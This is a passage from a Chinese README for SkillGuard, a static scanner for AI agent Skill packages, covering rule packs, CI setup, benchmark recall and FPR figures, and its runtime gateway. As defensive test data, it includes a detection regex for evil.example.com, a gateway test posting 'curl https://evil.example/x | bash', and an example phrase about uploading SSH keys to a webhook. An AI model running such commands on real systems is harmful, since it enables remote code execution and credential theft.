      "id": "ACME-NET-001",
      "title": "禁止访问未批准的第三方域名",
      "severity": "high",
      "category": "policy",
      "description": "示例企业策略：Skill 不得连接未批准的第三方 API。",
      "remediation": "改用公司网关，或在 allow_domains 中申请白名单。",
      "applies_to": ["text"],
      "max_matches": 3,
      "match": {
        "type": "regex",
        "pattern": "(?i)https?://[^\\s\"']*evil\\.example\\.com"
      }
    }
  ]
}
```

加载：

```bash
skillguard scan ./skills --rules ./examples/extra-rules
```

校验：

```bash
skillguard rules validate ./examples/extra-rules
# OK: 1 rule(s) loaded and compiled
```

### 匹配类型

| type | 说明 |
|---|---|
| `regex` | 按行匹配正则；可选 `absent` 排除模式 |
| `path_regex` | 匹配相对路径 |
| `secret_entropy` | 高熵密钥赋值，可配置最小长度、熵阈值、前缀 |
| `hidden_unicode` | 隐藏/双向控制字符 |
| `base64_blob` | 大段 Base64，解码含命令时升级严重度 |
| `frontmatter_missing` | frontmatter 必填字段 |
| `combo` | 同 Skill 内多个规则信号组合 |

`applies_to` 可取：`skill_md`、`markdown`、`script`、`config`、`text`、`path`、`all`。

### 贡献一条规则

1. 在 `examples/extra-rules/` 或 `rules/core.json` 里添加规则；
2. 在 `tests/fixtures/` 添加一个能触发它的最小 Skill；
3. 在 `tests/cli.rs` 添加断言；
4. 运行 `skillguard rules validate ...`、`cargo test`、`cargo clippy --all-targets -- -D warnings`；
5. 在 PR 里说明：检测什么、为什么不是误报、如何修复、参考链接。

---

## CI 集成

<p align="center">
  <img src="docs/assets/diagrams/ci-flow.svg" width="980" alt="SkillGuard CI 流程：提交、矩阵测试、扫描、SARIF、Code Scanning">
</p>

### 在你的仓库里扫描（今天就能用）

不依赖 npm 发布，直接构建并上传 SARIF：

```yaml
name: SkillGuard
on: [push, pull_request]

permissions:
  contents: read
  security-events: write

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo build --release
      - name: Scan skills
        run: >
          ./target/release/skillguard scan . --format sarif --fail-on high
          > skillguard.sarif
      - name: Upload SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: skillguard.sarif
```

### 使用本仓库的 composite Action（npm 包已发布，含 4 平台二进制）

`action.yml` 已包含在仓库中，通过 `npx seramys-skillguard` 运行；npm 包 0.3.0 已内含 4 个平台二进制。固定到发布标签：

```yaml
- uses: Seramys/skillguard@v0.3.0
  with:
    path: "."
    fail-on: high
    format: text
```

| 输入 | 默认值 | 说明 |
|---|---|---|
| `path` | `.` | 要扫描的目录 |
| `fail-on` | `high` | `low` / `medium` / `high` / `critical` / `none` |
| `format` | `sarif` | `text` / `json` / `sarif`，输出到运行日志 |
| `version` | `0.3.0` | npm 包版本 |

> composite Action 只运行扫描并设置退出码；它不写 SARIF 文件。需要 Code Scanning 时，用 `npx --yes seramys-skillguard@0.3.0 scan . --format sarif > skillguard.sarif`，或使用上面的本地构建工作流。

> npm 包 0.3.0 已包含 win32-x64、linux-x64、darwin-x64、darwin-arm64；Action 自测在 ubuntu/windows/macos x64 上运行 v0.3.0。

### 通用 CI

```bash
skillguard scan ./skills --fail-on high
```

退出码非 0 即失败；如果 CI 不消费 SARIF，也可以只保留 text/JSON 输出。

### 本仓库自己的 CI

`.github/workflows/ci.yml` 在 Ubuntu / Windows / macOS 三平台运行：

- `cargo test`
- `cargo build --release`
- `python bench/run.py --exe target/release/skillguard --split all --no-imported`（公开合成 smoke gate；不含真实 holdout）
- Python wheel 打包 + editable install
- npm 打包 + 启动器版本检查

---

## 检测基准

> 目标：把“检出率”变成可复现的数字，而不是规则数量的宣称。这里有两个套件，**不能混用它们的结果**。

| 套件 | 在 CI 运行 | 组成 | 当前结果 |
|---|---|---|---|
| 公开 smoke | 是 | 27 个基础 fixture + 320 恶意 / 520 良性生成语料 | 335 / 532；recall 100%，FPR 0% |
| **holdout-v3（盲测）** | 否 | 从 dev 冻结，P0–P3 调参期间未查看 | **212 / 334；recall 77.8%，FPR 3.0%** |
| holdout-v2 | 否 | 从 test 冻结；用于本轮精度验证 | 212 / 348；recall 75.0%，FPR 2.3% |
| holdout-v1（已污染） | 否 | 上一轮公开 holdout | 202 / 340；recall 81.2%，FPR 1.2% |

公开 smoke 是合成语料，100% 只证明扫描器、规则和打包没有坏，**不是对真实生态的质量证明**。holdout-v1 已被上一轮漏报分析污染，只保留用于回归；holdout-v3 是本次调参后未查看的盲测集，应作为当前质量数字。

holdout-v3 阈值曲线（2026-11-21，59 条规则）：

| 阈值 | Recall | FPR |
|---|---:|---:|
| low | 88.2%（187/212） | 52.7% |
| medium | 85.4%（181/212） | 51.8% |
| high | **77.8%（165/212）** | **3.0%（10/334）** |
| critical | 30.2%（64/212） | 0.9% |

`high` 是当前工作点：FPR 3.0%，recall 77.8%，达到 P0 的 75% / 3% 目标；90% 仍是 P2 语义层的目标。缺口主要是 MaliciousSkillBench 的改写型恶意样本；确定性规则可以继续压低，但不能把语义改写全部变成确定性信号。

冻结方法：

```bash
python bench/freeze_holdout.py
# holdout-v1: 202 malicious / 340 benign（冻结已污染集）
# holdout-v2: 212 / 348（来自 test）
# holdout-v3: 212 / 334（来自 dev，本次盲测）
```

> holdout-v2 在调参过程中被查看，因此可能已污染；holdout-v3 是最终盲测数字。后续发布前若要再次宣称召回，应冻结新的 dev/test 集，不能继续使用 v1/v2/v3 调规则。

扩展 holdout 组成（v1）：

| 来源 | 恶意 | 良性 |
|---|---:|---:|
| 生成语料 `holdout` | 106 | 173 |
| MaliciousSkillBench `holdout` | 96 | 0 |
| ClawHub reviewed `holdout` | 0 | 167 |
| **合计** | **202** | **340** |

Cisco 评测集和 Trail of Bits 样本属于基础 smoke fixture，不计入扩展 holdout。ClawHub 500 条良性均逐条复核并标为 `reviewed`；MaliciousSkillBench 300 条沿用原始 benchmark 标注，不使用本扫描器自标。

本轮精度处理：

- 新增 10 条准入规则：隐藏 pre-flight、Windows 账户、持久化、编码执行、动态执行、凭证外传/读取、下载执行、隐蔽执行、可选语义；
- `SG-INIT-001` 只在“预检/初始化/首次执行”上下文与脚本执行同时出现时触发，并要求脚本名可疑或邻近存在隐蔽话术；
- `SG-CRED-001` 只在同一代码块内出现敏感文件读取与真实外传端点时触发；
- `SG-PERM-002` 从 `high` 降为 `medium`：文档里提到敏感路径进入审查队列，不再直接阻断；
- `SG-HYG-001` 只要求 `name` / `description`；`SG-PI-001` 忽略否定句；`SG-PI-003` 不跨句；
- 高置信误报降到 10/334（3.0%），盲测 recall 提升到 77.8%。

运行：

```bash
cargo build --release
python bench/fetch_samples.py
python bench/make_corpus.py

# CI 公开 smoke（不需要本地真实语料）
python bench/run.py --exe target/release/skillguard --split all --no-imported

# 冻结集（manifest 已提交；真实样本留在本地）
python bench/run.py --exe target/release/skillguard \
  --manifest bench/imported/holdout-v3.manifest.json \
  --generated-manifest bench/imported/__none__.json --no-imported --split all
```

门禁参数在 `bench/manifest.json`：`target_fpr=0.03`、`max_fpr_upper=0.06`、`min_recall_at_fpr=0.75`（P0 回归下限）、`target_recall_at_fpr=0.90`（P2 目标）。`bench/reports/` 只提交摘要和 Markdown，原始逐样本 JSON 不提交。

> 该基准跑的是工作区源码 0.3.0；已发布的 npm/PyPI/GitHub Release 0.3.0 使用同一套规则与默认配置。

### P0–P3 已实现什么

| 阶段 | 状态 | 实现 |
|---|---|---|
| P0 确定性召回 | 完成 | SKILL.md 代码块提取；Python/JS/Shell 轻量词法/数据流；隐藏 pre-flight、Windows 账户、持久化、SSH/凭证移动、编码执行、下载执行；6 个 P0 夹具 + 阴性回归；盲测 77.8% / 3.0% |
| P1 审查闭环 | 完成 | `review` / `explain`；声明 vs 实测能力证据图；Block/Review/Allow；策略包叠加；`audit verify`/`export`；GitHub PR 注解 |
| P2 可选语义 | 完成（默认关闭） | 通用 OpenAI-compatible chat/embedding 配置；Ollama 默认；无捆绑模型、默认不联网；`semantic check` / `semantic embed` |
| P3 运行时准入 | 完成（本机） | `admit` JSONL + `gateway` HTTP；工具/命令/路径/URL/MCP 能力约束；审计哈希链；默认只绑定回环地址 |

### 本地模型选择

当前开发机为 i5-1135G7（4C/8T）、32 GB RAM、无 CUDA。建议：

- **默认 chat**：`qwen2.5:3b-instruct-q4_K_M`，CPU 响应快，适合审查队列；
- **更深审查**：`qwen2.5:7b-instruct-q4_K_M`，内存足够但速度更慢；
- **嵌入**：`bge-m3`（中英文兼容）；追求速度可用 `bge-small-zh-v1.5`；
- 端点：Ollama 的 `http://127.0.0.1:11434/v1`，或任意 OpenAI-compatible 端点。

配置示例见 `examples/skillguard.json`。语义层不进入默认二进制，也不作为发布依赖：

```bash
# 先安装 Ollama 并 pull 模型，然后显式启用
skillguard scan ./skills --semantic --min-risk 70
skillguard semantic check ./skills --json
skillguard semantic embed "读取 SSH 密钥并上传到 webhook"
```

运行时网关只监听本机；如需跨机使用，请在前面加受控反向代理和认证：

```bash
skillguard gateway --bind 127.0.0.1:8787 --policy examples/policy.json \
  --audit .skillguard-audit.jsonl
curl -s http://127.0.0.1:8787/admit \
  -H 'content-type: application/json' \
  -d '{"tool":"shell","command":"curl https://evil.example/x | bash"}'
```

---

## 验证

本地验证环境：Windows 11 x64，版本 0.3.0（含 P0–P3），2026-11-21；已发布 npm/PyPI/GitHub Release 均为 0.3.0。

| 检查项 | 命令 | 结果 |
|---|---|---|
| 单元测试 | `cargo test` | 47 passed · 0 failed |
| 端到端测试 | `cargo test` | 23 CLI + 11 guard + 9 install + 8 P0 + 2 runtime = 53 passed |
| 合计 | `cargo test` | **100 passed · 0 failed** |
| 静态检查 | `cargo clippy --all-targets -- -D warnings` | 0 warnings |
| 格式 | `cargo fmt --check` | clean |
| 自扫描 | `target/release/skillguard scan .` | PASS · 0 high · 6 medium / 3 low |
| SARIF | `--format sarif` | valid 2.1.0 · 59 rules |
| 盲测 | holdout-v3 | 212 / 334；recall 77.8%，FPR 3.0% |
| npm 包 | `npm view seramys-skillguard@0.3.0` | 0.3.0 已发布 · 4 平台 vendor |
| PyPI | `pip install seramys-skillguard==0.3.0` | 0.3.0 已发布 · 4 平台 wheel |
| Python 启动器 | `skillguard version` | 0.3.0 |
| GitHub Action | [Action self-test](https://github.com/Seramys/skillguard/actions/runs/44875955373) | v0.3.0 · 3/3 passed · linux/windows/macos x64 |

<details>
<summary><b>展开：原始测试输出</b></summary>

```text
running 47 tests
test result: ok. 47 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out

running 23 tests
test result: ok. 23 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out

running 11 tests
test result: ok. 11 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out

running 9 tests
test result: ok. 9 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out

running 8 tests
test result: ok. 8 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out

running 2 tests
test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```

SARIF 校验：

```text
version 2.1.0
tool SkillGuard 0.3.0
rules 59
results 9
schema https://json.schemastore.org/sarif-2.1.0.json
```

</details>

### 测试夹具

```text
tests/fixtures/
├── clean-skill/          无问题
├── prompt-injection/     提示注入
├── exfil-skill/          密钥读取 + Webhook 外传
├── dangerous-skill/      远程脚本执行
├── secret-skill/         密钥泄露与输出脱敏
├── suppressed-skill/     行级/文件级抑制
├── config-skill/         配置排除路径
├── collection/           多 Skill 发现
├── padding-skill/        空白填充隐藏环境变量导出
└── exclude-root/         发现阶段嵌套排除
```

> 截图来自本地实际运行；终端文本未改动，仅为可读性做了颜色和排版。验证报告中的数字来自上述命令的实际输出。

---

## 已知限制

- 默认是**静态规则 + 轻量代码数据流**扫描；可选语义层需要显式配置本地/远程模型，不进入默认发布依赖。高度改写或依赖运行时生成代码的提示注入仍可能漏报。
- 容器解包只覆盖常见 Office/ZIP 一层结构，不解析加密容器、宏或 OLE 对象。
- pyc 检测基于源码大小/时间戳/哈希与可打印字符串，不反编译完整字节码。
- 不能检测只在运行时出现的行为；运行时防护属于下一阶段。
- frontmatter 解析是轻量实现，复杂的嵌套 YAML 可能无法完整还原。
- 规则是模式匹配，存在误报；请用 `--ignore`、`.skillguardignore` 或 `allow_domains` 收敛。
- 不扫描超过 `--max-file-size` 的普通文本；Office/ZIP 容器按独立的 16 MB 上限处理。
- 扫描根目录若没有 `SKILL.md`，会把整个目录当作一个 Skill 处理；大型代码仓库建议显式指定 `./skills` 或使用 `exclude`。

**不要把 SkillGuard 当成唯一防线。** 它适合放在“安装前 / 合并前”的静态检查层；生产环境仍应配合沙箱、最小权限、依赖锁定、代码审查和运行时审批。

---

## FAQ

<details>
<summary><b>它会执行被扫描的 Skill 吗？</b></summary>

不会。SkillGuard 只读取文本和路径，不执行脚本、不加载依赖、不调用被扫描代码。

</details>

<details>
<summary><b>会上传代码或密钥吗？</b></summary>

不会。扫描完全在本地进行，不发起网络请求。输出中的密钥会脱敏；但 JSON/SARIF 仍可能包含文件名、路径和上下文片段，分享前请自行确认。

</details>

<details>
<summary><b>为什么用 Rust？</b></summary>

单文件、无运行时、启动快；线性时间正则更适合扫描不可信输入；同一引擎可以被 Node/Python 启动器复用。

</details>

<details>
<summary><b>为什么不用 LLM 做语义扫描？</b></summary>

LLM 语义分析可以作为补充，但不适合作为唯一闸门：结果不确定、需要模型/端点、难以在 CI 中稳定复现。SkillGuard 默认只用确定性、离线、可解释的静态规则；语义层是显式启用的可选提供者，支持 Ollama 或任意 OpenAI-compatible 端点，不捆绑模型，也不改变默认离线路径。

</details>

<details>
<summary><b>误报太多怎么办？</b></summary>

先确认是否真的是误报；如果是，优先用最小范围的抑制：行级 → 文件级 → 项目级。合法域名可以用 `allow_domains`；企业策略可以写成外部规则包，而不是关掉整类规则。

</details>

<details>
<summary><b>能扫描整个仓库吗？</b></summary>

可以，但如果没有 `SKILL.md`，根目录会被当作一个 Skill；大型仓库建议显式指定 Skill 目录，或用 `exclude` 排除构建产物、依赖和测试夹具。扫描上限是 1000 个 Skill / 5000 个文件。

</details>

<details>
<summary><b>支持哪些平台？</b></summary>

源码支持 Windows / Linux / macOS；CI 矩阵在三平台运行测试和 release 构建。0.3.0 在 Windows 11 x64 完成本地验证，npm/PyPI/GitHub Release 均提供四平台包与二进制。

</details>

<details>
<summary><b>npm / PyPI 已经发布了吗？</b></summary>

0.3.0 已发布到 npm / PyPI / GitHub Release，包含 Windows、Linux、macOS x64/arm64 平台包与二进制。其他架构请源码构建。

</details>

<details>
<summary><b>能接入 GitHub Code Scanning 吗？</b></summary>

可以。使用 `--format sarif` 生成 SARIF 2.1.0，再用 `github/codeql-action/upload-sarif@v3` 上传；需要 `security-events: write` 权限。

</details>

<details>
<summary><b>如何添加自己的规则？</b></summary>

写一个 JSON 规则包，用 `--rules` 加载，或放到配置的 `rules_dir`。同 ID 会覆盖内置规则并输出 warning。建议同时提交一个最小 fixture 和 CLI 测试，确保规则可回归。

</details>

---

## 路线图

> 以下是方向，不是承诺；优先级会根据真实使用反馈调整。

- **0.2（npm/PyPI 已发布）**：策略权威性、lock/audit 哈希链、install 加固与公开/扩展双基准。
- **0.3（npm/PyPI/Release 已发布）**：59 条规则、代码块/数据流、Block/Review/Allow、证据图、策略包、审计导出、GitHub 注解、可选本地语义层、运行时 admit/gateway；盲测 77.8% / 3.0%。
- **1.0**：运行时 Agent 网关、工具调用审批、集中策略与审计控制台。

### 标识

<p align="center">
  <img src="docs/assets/brand/logo.svg" width="96" alt="SkillGuard mark">
</p>

- **浏览器卡片**：Skill 是可分发、可安装的软件包；
- **四角扫描框**：静态扫描的聚焦与边界；
- **盾牌 + 对勾**：供应链防护与通过检查；
- **青色扫描光束**：只读、离线、逐行检查；
- **四角星**：AI / Agent 语境。

浅色与深色两套矢量标识在 [`docs/assets/brand/`](docs/assets/brand/)。

---

## 贡献

欢迎规则、fixture、误报报告、文档和翻译。提交前请确保：

```bash
cargo fmt --check
cargo clippy --all-targets -- -D warnings
cargo test
```

新增规则时，最好同时提供：

- 一个能触发规则的最小 Skill（positive fixture）；
- 一个不应该触发的近似样例（negative fixture）；
- 一条 CLI 断言；
- 规则说明、修复建议和参考链接。

安全漏洞请通过 [SECURITY.md](SECURITY.md) 私下报告，不要开公开 issue。

<details>
<summary><b>维护者：发布与打包</b></summary>

### npm

1. 更新 `packages/npm/package.json` 的版本和仓库地址；
2. `bash scripts/package-npm.sh`；
3. `cd packages/npm && npm pack` 检查包内包含 `vendor/<platform>/skillguard[.exe]`；
4. `npm publish --access public`。

当前多平台发布采用“一个 npm 包内含全部平台二进制 + 每个平台独立 wheel”的方式；如果后续包体积成为问题，再拆平台子包。

### Python

1. 更新 `packages/python/pyproject.toml` 的版本和仓库地址；
2. `python -m pip install build`；
3. `bash scripts/package-python.sh`；
4. `twine upload packages/python/dist/*`。

### 单文件二进制

1. `bash scripts/build-all.sh`；
2. 将 `dist/<platform>-<arch>/skillguard[.exe]` 附加到 GitHub Release；
3. 在 Release 说明中给出 SHA256。

发布新版本后，同步更新 `action.yml` 的默认 `version` 和 README 中的版本号。

</details>

---

## License

MIT。见 [LICENSE](LICENSE)。

---

<div align="center">

<img src="docs/assets/brand/lockup.svg" width="480" alt="SkillGuard">

<br>

**装 Skill 之前，先让 SkillGuard 看一眼。**

<sub>AI Agent Skill Supply-Chain Security Scanner · MIT License</sub>

</div>
